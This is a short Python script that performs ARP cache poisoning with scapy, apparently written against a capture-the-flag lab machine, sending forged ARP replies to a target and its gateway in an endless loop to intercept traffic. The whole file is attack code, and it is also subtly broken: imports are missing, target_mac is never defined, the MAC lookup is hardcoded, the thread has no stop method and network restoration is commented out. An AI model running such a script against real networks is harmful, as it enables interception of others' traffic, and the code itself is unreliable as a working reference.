import scapy
import threading

interface = "tun0"
target_ip = "10.10.10.133"
my_ip = "10.10.14.12"
gateway_ip="10.10.10.2"


def get_mac(ip_address):
    return "00:50:56:8f:d6:45"

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):

      poison_target = ARP()
      poison_target.op   = 2
      poison_target.psrc = gateway_ip
      poison_target.pdst = target_ip
      poison_target.hwdst= target_mac

      poison_gateway = ARP()
      poison_gateway.op   = 2
      poison_gateway.psrc = target_ip
      poison_gateway.pdst = gateway_ip
      poison_gateway.hwdst= gateway_mac

      print("[*] Beginning the ARP poison. [CTRL-C to stop]")

      while True:
          try:
              send(poison_target)
              send(poison_gateway)

              time.sleep(2)
          except KeyboardInterrupt:
              return 0
      print("[*] ARP poison attack finished.")
      return 0


gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway {} is at {}".format(gateway_ip,gateway_mac))


try:
    
    poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac,target_ip,target_mac))
    poison_thread.start()
    while True:
        print("[*] poisoned")

except KeyboardInterrupt:
      # restore the network
      #restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
      poison_thread.stop()
      sys.exit(0)
